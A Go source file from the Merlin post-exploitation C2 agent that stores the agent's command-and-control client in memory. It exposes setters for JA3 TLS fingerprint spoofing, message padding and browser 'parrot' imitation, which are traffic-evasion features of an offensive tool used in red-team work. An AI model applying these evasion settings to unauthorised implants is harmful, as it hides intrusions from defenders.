/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

// Package memory is an in-memory repository for storing and managing Merlin clients used to communicate with the Merlin
// server or for peer-to-peer Agent communications
package memory

import (
	// Standard
	"sync"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/clients"
)

// Repository is the structure that implements the in-memory repository for interacting with the Agent's C2 client
type Repository struct {
	sync.Mutex
	client clients.Client
}

// repo is the in-memory datastore
var repo *Repository

// NewRepository creates and returns a new in-memory repository for interacting with the Agent's C2 client
func NewRepository() *Repository {
	if repo == nil {
		repo = &Repository{
			Mutex: sync.Mutex{},
		}
	}
	return repo
}

// Add stores the Merlin Agent C2 client to the repository
func (r *Repository) Add(client clients.Client) {
	r.Lock()
	defer r.Unlock()
	r.client = client
}

// Get returns the current C2 Client object the Agent is using for communications
func (r *Repository) Get() clients.Client {
	return r.client
}

// SetJA3 reconfigures the client's TLS fingerprint to match the provided JA3 string
func (r *Repository) SetJA3(ja3 string) error {
	r.Lock()
	defer r.Unlock()
	return r.client.Set("ja3", ja3)
}

// SetListener changes the client's upstream listener ID, a UUID, to the value provided
func (r *Repository) SetListener(listener string) error {
	r.Lock()
	defer r.Unlock()
	return r.client.Set("listener", listener)
}

// SetPadding changes the maximum amount of random padding added to each outgoing message
func (r *Repository) SetPadding(padding string) error {
	r.Lock()
	defer r.Unlock()
	return r.client.Set("paddingmax", padding)
}

// SetParrot reconfigures the client's HTTP configuration to match the provided browser
func (r *Repository) SetParrot(parrot string) error {
	r.Lock()
	defer r.Unlock()
	return r.client.Set("parrot", parrot)
}
